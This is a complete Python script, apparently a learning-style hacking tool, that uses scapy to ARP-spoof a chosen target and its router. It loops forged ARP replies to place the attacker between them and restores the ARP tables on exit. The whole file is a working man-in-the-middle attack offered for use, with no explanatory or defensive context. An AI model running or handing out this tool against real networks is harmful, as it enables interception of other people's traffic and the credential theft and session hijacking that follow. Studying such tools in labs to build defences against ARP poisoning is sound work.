#!/usr/bin/env python
import sys
import time
import optparse
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether

parser = optparse.OptionParser()
parser.add_option("-t", "--target", dest="target", help="Target IP")
parser.add_option("-r", "--router", dest="router", help="Router IP")
(options, arguments) = parser.parse_args()


def get_mac(ip):
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = scapy.srp(arp_packet, timeout=5, verbose=False)[0]
    return str(answered[0][1].hwsrc)


def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def repair(target_ip, router_ip):
    target_mac=get_mac(target_ip)
    router_mac=get_mac(router_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, verbose=False)
    packet = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet, verbose=False)


tar_ip = str(options.target)
rt_ip = str(options.router)
target = get_mac(tar_ip)
router = get_mac(rt_ip)
packet_sent = 0
while True:
    try:
        arp_spoof(tar_ip, rt_ip, target)
        arp_spoof(rt_ip, tar_ip, router)
        print("\r[+] Packets sent: " + str(packet_sent), end='')
        sys.stdout.flush()
        packet_sent += 2
        time.sleep(2)
    except KeyboardInterrupt:
        repair(tar_ip, rt_ip)
        print("\n[+] Packets sending finished")
        break
